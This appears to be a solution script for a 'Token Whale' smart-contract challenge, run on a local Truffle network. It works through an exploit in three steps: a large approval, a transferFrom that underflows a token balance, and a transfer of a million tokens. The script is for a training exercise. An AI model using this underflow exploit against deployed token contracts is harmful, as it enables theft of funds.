/**
 * INSTRUCTIONS
 *
 * 1. Start development network by running `truffle development`
 * 2. Copy mnemonic to the variable below and double-check localhost port is correct
 * 3. Run migration in development and re-execute all the steps: `truffle migrate --reset`
 * 4. Copy created contract address to the variable below
 * 5. Follow the 3 steps, each one at the time

 *
 * SOLUTION
 *
 * "transferFrom" function has a flaw, it's testing the input parameters
 * "from" and "to" but in reality the transfer is performed using msg.sender
 */

const HDWalletProvider = require("@truffle/hdwallet-provider");
const Web3 = require("web3");
const Web3Utils = require("web3-utils");
const fs = require("fs");
const BN = require('bn.js')

const mnemonic =
  "process pool juice infant shallow nuclear fit math win auction kitten slight";

const provider = new HDWalletProvider({
  mnemonic: {
    phrase: mnemonic,
  },
  providerOrUrl: "http://localhost:9545",
});

const web3 = new Web3(provider);

const abi = JSON.parse(
  fs.readFileSync("./2_token_whale_local/build/contracts/TokenWhaleChallenge.json")
).abi;

// replace contract addresses accordingly after running `truffle migrate --reset`
const contractAddress = "0xf44f416257aE3e586bF00be82855175b50040273";

async function main() {
  try {
    const accounts = await web3.eth.getAccounts();
    const contract = new web3.eth.Contract(abi, contractAddress);
    const gasPrice = await web3.eth.getGasPrice();

    const player = accounts[0];
    const to = accounts[1];

    /**
     * 1st step - set high allowance
     */
    // const res = await contract.methods
    //   .approve(to, 30000000)
    //   .send({ from: player, gasPrice });

    // console.log(res);

    // contract.methods
    //   .allowance(player, to)
    //   .call()
    //   .then(console.log);

    /**
     * 2st step - 1 is enough to underflow balance of "to", that is,
     * balance of "to" is zero, if we substract by 1...
     */
    // const transferValue = 1;
    // const res = await contract.methods
    //   .transferFrom(player, player, transferValue)
    //   .send({ from: to, gasPrice });

    // console.log(res);

    // contract.methods
    //   .balanceOf(to)
    //   .call()
    //   .then(console.log);

    // contract.methods
    //   .balanceOf(player)
    //   .call()
    //   .then(console.log);


    /**
     * 3rd step - "to" has a huge balance now, transfer the 1 million we need
     */
    const res = await contract.methods
      .transfer(player, 1000000)
      .send({ from: to, gasPrice });

    console.log(res);

    contract.methods
      .balanceOf(to)
      .call()
      .then(console.log);

    contract.methods
      .balanceOf(player)
      .call()
      .then(console.log);

  } catch (ex) {
    console.warn(ex);
  } finally {
    provider.engine.stop();
  }
}

main();
